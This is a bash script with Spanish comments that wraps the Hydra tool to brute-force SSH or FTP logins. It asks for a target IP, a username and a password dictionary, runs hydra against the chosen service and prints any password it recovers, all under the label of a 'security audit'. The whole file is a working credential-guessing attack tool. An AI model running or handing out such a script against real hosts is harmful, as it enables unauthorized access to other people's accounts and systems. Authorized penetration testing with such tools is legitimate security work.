#!/bin/bash

#Colores
greenColour="\e[0;32m\033[1m" 
endColour="\033[0m\e[0m" 
redColour="\e[0;31m\033[1m" 
blueColour="\e[0;34m\033[1m" 
yellowColour="\e[0;33m\033[1m" 
purpleColour="\e[0;35m\033[1m" 
turquoiseColour="\e[0;36m\033[1m" 
grayColour="\e[0;37m\033[1m"


trap ctrl_c INT 

#Funcion Trap 
function ctrl_c(){
  echo -e "\n${redColour}Exiting...${endColour}\n"
  exit 1
}


#Interface
read -p "$(echo -e "\n${grayColour}Enter IP target: ${endColour}")" target

read -p "$(echo -e "\n${grayColour}Enter User: ${endColour}")" user

read -p "$(echo -e "\n${grayColour}Enter dictionary: ${endColour}")" dictionary

if ! command -v hydra &> /dev/null; then
  echo -e "\n${redColour}Hydra is not installed. Install it with sudo apt install hydra.${endColour}\n " && exit
else
  echo -e "\n${greenColour}Hydra is installed.${endColour}\n"
fi 

if [ ! -f "$dictionary" ]; then
  echo -e "\n${redColour}The dictionary password '$dictionary' not exist.You must put it inside the current directory\n"
  exit 
fi 

#Funciones ataques SSH/FTP
ssh_attack(){
  #Fuerza bruta
  echo -e "\n${yellowColour}Starting security audit via SSH${endColour}\n"
  sleep 3

  output=$(hydra -l "$user" -P "$dictionary" ssh://"$target" -t 4 -vV 2>/dev/null)

  #Resultado
  if echo "$output" | grep -qi "login:\|password:"; then
    password=$(echo "$output" | grep -oP "password: \K.*")
    echo -e "\n${greenColour}The password is: ${endColour}${redColour}$password${endColour}"
    exit 0 
  else 
    echo -e "\n${redColour}No valid password found in this file${endColour}"
    exit 0  
  fi 

}

ftp_attack(){
  #Fuerza bruta
 echo -e "\n${yellowColour}Starting security audit via SSH${endColour}\n"
 sleep 3

  output=$(hydra -l "$user" -P "$dictionary" ftp://"$target" -t 4 -vV 2>/dev/null)
  
  #Resultado
  if echo "$output" | grep -qi "login:\|password:"; then
    password=$(echo "$output" | grep -oP "password: \K.*")
    echo -e "\n${greenColour}The password is: ${endColour}${redColour}$password${endColour}"
    exit 0 
  else 
    echo -e "\n${redColour}No valid password found in this file${endColour}"
    exit 0
  fi 
}

#Llamada a funciones 
read -p "$(echo -e "\n${grayColour}Choose the attack SSH or FTP (Write ${redColour}SSH${endColour} ${grayColour}or${endColour} ${redColour}FTP${endColour}): ")" election

if [ "$election" == "SSH" ]; then
  ssh_attack
elif [ "$election" == "FTP" ]; then
  ftp_attack
else 
  echo -e "\n${grayColour}You need to write${endColour} ${redColour}SSH${endColour} ${grayColour}or${endColour} ${redColour}FTP${endColour}"
  exit 0 
fi 
